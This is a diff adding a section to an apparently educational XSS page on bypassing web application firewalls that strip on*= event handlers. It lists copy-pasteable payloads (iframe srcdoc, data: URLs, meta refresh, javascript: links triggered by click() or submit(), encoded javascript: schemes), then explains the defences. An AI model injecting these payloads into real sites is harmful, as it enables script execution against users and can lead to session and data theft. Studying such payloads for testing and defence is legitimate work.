@@ -1149,15 +1149,163 @@ body { background-image: url("javascript​:alert('CSS XSS')"); }</code></pre>
           <li>Carriage return (CR) is 'D' in hexadecimal representation</li>
         </uL>
         <p>Examples <code>&lt;img src="javascript:alert('XSS');"&gt;</code> can be used as: </p>
-<pre>
-&lt;img src="jav&amp;#x09;ascript:alert('XSS');"&gt;  // Tab (9)
-&lt;img src="jav&amp;#x0A;ascript:alert('XSS');"&gt;  // Line Feed (A)
-&lt;img src="jav&amp;#x0D;ascript:alert('XSS');"&gt;  // Carriage Return (D)
-  </pre>
-        <a href="https://github.com/Edr4/XSS-Bypass-Filters">XSS Filters Bypass Payloads</a>
-        <p>Cheat Sheet for <a href="https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html" target="_blank">XSS Filter Evasion by OWASP.ORG</a></p>
+        <pre>
+        &lt;img src="jav&amp;#x09;ascript:alert('XSS');"&gt;  // Tab (9)
+        &lt;img src="jav&amp;#x0A;ascript:alert('XSS');"&gt;  // Line Feed (A)
+        &lt;img src="jav&amp;#x0D;ascript:alert('XSS');"&gt;  // Carriage Return (D)
+          </pre>
+                <a href="https://github.com/Edr4/XSS-Bypass-Filters">XSS Filters Bypass Payloads</a>
+                <p>Cheat Sheet for <a href="https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html" target="_blank">XSS Filter Evasion by OWASP.ORG</a></p>
+        </div>
+        <!-- Context & Evasion End -->
+       <!-- Bypassing WAF for on*= event handlers Start -->
+      <div class="suggested-topics">
+        <a class="topic" href="#bypass-waf-strip-of-on-event-handlers">
+          <span style="font-size: larger;">Bypassing WAF strip of <cpde>on*=</cpde> event handlers</span>
+          <span class="plus">+</span>
+        </a>
       </div>
-      <!-- Context & Evasion End -->
+      <div class="bypass-waf-strip-of-on-event-handlers-content" style="display: none;">
+      <p>If the WAF strips every <code>on*</code> = attribute, the trick is to use non‑attribute sinks or navigations/containers that execute JS without any event attributes.</p>
+      <P>Here are practical, copy‑pasteable payload ideas we can use (all avoid on*=).</p>
+      <h3>1) Use inline script via <code>srcdoc</code> (no events)</h3>
+        <div class="code-block-wrapper" style="margin-top: -50px;">
+          <div class="flex justify-end" style="position: relative; display: flex; justify-content: flex-end; padding: 0.5rem; background-color: var(--accent-color); border-bottom: 1px solid var(--border-color); top: 50px;">
+            <button class="code-cp-btn"> 
+              <svg xmlns="http://www.w3.org/2000/svg" width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy" aria-hidden="true">
+                <rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect>
+                <path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path>
+              </svg>
+            </button>
+          </div>
+          <pre><code class="code-txt">&lt;iframe srcdoc="&lt;script&gt;alert(document.domain)&lt;/script&gt;"&gt;&lt;/iframe&gt;</code></pre>
+        </div>
+        
+        <h3>2) Use a <code>data:</code> URL inside an iframe/object</h3>
+        <div class="code-block-wrapper" style="margin-top: -50px;">
+          <div class="flex justify-end" style="position: relative; display: flex; justify-content: flex-end; padding: 0.5rem; background-color: var(--accent-color); border-bottom: 1px solid var(--border-color); top: 50px;">
+            <button class="code-cp-btn"> 
+              <svg xmlns="http://www.w3.org/2000/svg" width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy" aria-hidden="true">
+                <rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect>
+                <path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path>
+              </svg>
+            </button>
+          </div>
+          <pre><code class="code-txt">&lt;iframe src="data:text/html,&lt;script&gt;alert(document.domain)&lt;/script&gt;"&gt;&lt;/iframe&gt;</code></pre>
+        </div>
+        <div class="code-block-wrapper" style="margin-top: -50px;">
+          <div class="flex justify-end" style="position: relative; display: flex; justify-content: flex-end; padding: 0.5rem; background-color: var(--accent-color); border-bottom: 1px solid var(--border-color); top: 50px;">
+            <button class="code-cp-btn"> 
+              <svg xmlns="http://www.w3.org/2000/svg" width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy" aria-hidden="true">
+                <rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect>
+                <path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path>
+              </svg>
+            </button>
+          </div>
+          <pre><code class="code-txt">&lt;object data="data:text/html,&lt;script&gt;alert(document.domain)&lt;/script&gt;"&gt;&lt;/object&gt;</code></pre>
+        </div>
+        
+        <h3>3) Plain <code>&lt;script&gt;</code> (if only <code>on*</code> is stripped)</h3>
+        <div class="code-block-wrapper" style="margin-top: -50px;">
+          <div class="flex justify-end" style="position: relative; display: flex; justify-content: flex-end; padding: 0.5rem; background-color: var(--accent-color); border-bottom: 1px solid var(--border-color); top: 50px;">
+            <button class="code-cp-btn"> 
+              <svg xmlns="http://www.w3.org/2000/svg" width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy" aria-hidden="true">
+                <rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect>
+                <path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path>
+              </svg>
+            </button>
+          </div>
+          <pre><code class="code-txt">&lt;script&gt;alert(document.domain)&lt;/script&gt;</code></pre>
+        </div>
+        <div class="code-block-wrapper" style="margin-top: -50px;">
+          <div class="flex justify-end" style="position: relative; display: flex; justify-content: flex-end; padding: 0.5rem; background-color: var(--accent-color); border-bottom: 1px solid var(--border-color); top: 50px;">
+            <button class="code-cp-btn"> 
+              <svg xmlns="http://www.w3.org/2000/svg" width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy" aria-hidden="true">
+                <rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect>
+                <path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path>
+              </svg>
+            </button>
+          </div>
+          <pre><code class="code-txt">&lt;svg&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt;&lt;/svg&gt;</code></pre>
+        </div>
+        
+        <h3>4) <code>javascript:</code> without events (programmatic trigger)</h3>
+        <div class="code-block-wrapper" style="margin-top: -50px;">
+          <div class="flex justify-end" style="position: relative; display: flex; justify-content: flex-end; padding: 0.5rem; background-color: var(--accent-color); border-bottom: 1px solid var(--border-color); top: 50px;">
+            <button class="code-cp-btn"> 
+              <svg xmlns="http://www.w3.org/2000/svg" width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy" aria-hidden="true">
+                <rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect>
+                <path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path>
+              </svg>
+            </button>
+          </div>
+          <pre><code class="code-txt">&lt;a id="p" href="javascript:alert(document.domain)"&gt;x&lt;/a&gt;
+        &lt;script&gt;p.click()&lt;/script&gt;</code></pre>
+        </div>
+        
+        <h3>5) Form navigation to <code>javascript:</code></h3>
+        <div class="code-block-wrapper" style="margin-top: -50px;">
+          <div class="flex justify-end" style="position: relative; display: flex; justify-content: flex-end; padding: 0.5rem; background-color: var(--accent-color); border-bottom: 1px solid var(--border-color); top: 50px;">
+            <button class="code-cp-btn"> 
+              <svg xmlns="http://www.w3.org/2000/svg" width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy" aria-hidden="true">
+                <rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect>
+                <path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path>
+              </svg>
+            </button>
+          </div>
+          <pre><code class="code-txt">&lt;form id="f" action="javascript:alert(document.domain)"&gt;&lt;/form&gt;
+        &lt;script&gt;f.submit()&lt;/script&gt;</code></pre>
+        </div>
+        
+        <h3>6) Meta refresh to a payload</h3>
+        <div class="code-block-wrapper" style="margin-top: -50px;">
+          <div class="flex justify-end" style="position: relative; display: flex; justify-content: flex-end; padding: 0.5rem; background-color: var(--accent-color); border-bottom: 1px solid var(--border-color); top: 50px;">
+            <button class="code-cp-btn"> 
+              <svg xmlns="http://www.w3.org/2000/svg" width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy" aria-hidden="true">
+                <rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect>
+                <path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path>
+              </svg>
+            </button>
+          </div>
+          <pre><code class="code-txt">&lt;meta http-equiv="refresh" content="0;url=data:text/html,&lt;script&gt;alert(document.domain)&lt;/script&gt;"&gt;</code></pre>
+        </div>
+        
+        <h3>7) External script include (no events)</h3>
+        <div class="code-block-wrapper" style="margin-top: -50px;">
+          <div class="flex justify-end" style="position: relative; display: flex; justify-content: flex-end; padding: 0.5rem; background-color: var(--accent-color); border-bottom: 1px solid var(--border-color); top: 50px;">
+            <button class="code-cp-btn"> 
+              <svg xmlns="http://www.w3.org/2000/svg" width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy" aria-hidden="true">
+                <rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect>
+                <path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path>
+              </svg>
+            </button>
+          </div>
+          <pre><code class="code-txt">&lt;script src="data:text/javascript,alert(document.domain)"&gt;&lt;/script&gt;</code></pre>
+        </div>
+        <h3>Why these bypass a basic “strip all on*” WAF</h3>
+        <p>These payloads work because they <strong>avoid event handler attributes entirely</strong> and instead trigger JavaScript execution through other browser features:</p>
+        <ul>
+          <li><strong>Script contexts:</strong> direct <code>&lt;script&gt;</code> execution or injected JavaScript via <code>srcdoc</code> or <code>data:</code> URLs.</li>
+          <li><strong>Navigation to executable schemes:</strong> <code>javascript:</code> or <code>data:</code> schemes that run code when loaded.</li>
+          <li><strong>HTML containers that parse code:</strong> <code>&lt;iframe&gt;</code>, <code>&lt;object&gt;</code>, and similar elements that treat embedded HTML as a new document.</li>
+          <li><strong>Programmatic actions:</strong> <code>.click()</code> and <code>.submit()</code> trigger behaviors without any inline <code>on*</code> attributes.</li>
+        </ul>
+        <p>A naive WAF that <em>only</em> removes attributes like <code>onclick</code>, <code>onerror</code>, <code>onload</code> will leave these vectors untouched unless it also blocks:</p>
+        <ul>
+          <li>Entire HTML elements (<code>&lt;script&gt;</code>, <code>&lt;iframe&gt;</code>, <code>&lt;meta&gt;</code>, <code>&lt;object&gt;</code>)</li>
+          <li>Dangerous URL schemes (<code>javascript:</code>, <code>data:</code>)</li>
+          <li>Or enforces strong Content Security Policy (CSP)</li>
+        </ul>
+        
+        <h3>Caveats</h3>
+        <ul>
+          <li>Modern browsers may block certain payloads (e.g., <code>javascript:</code> in iframe <code>src</code>) — <code>data:</code> URLs are more reliable.</li>
+          <li>If the sandbox for the iframe removes <code>allow-scripts</code>, no JavaScript will execute inside it.</li>
+          <li>If CSP forbids inline scripts or <code>data:</code> URLs, many of these won’t work.</li>
+          <li>For real-world bypasses, you might need to chain with encoding, tag obfuscation, or alternate script injection sinks.</li>
+        </ul>
+      </div>
+      <!-- Bypassing WAF for on*= event handlers End -->
       <!-- XSS Lab's Solutions start -->
       <div class="suggested-topics">
         <a class="topic" href="#xxs-lab-soln">
@@ -1400,6 +1548,7 @@ body { background-image: url("javascript​:alert('CSS XSS')"); }</code></pre>
       <script src="../../scripts/main.js"></script>
       <script src="../../scripts/msg-popup.js"></script>
 </html>
+
 
 
 
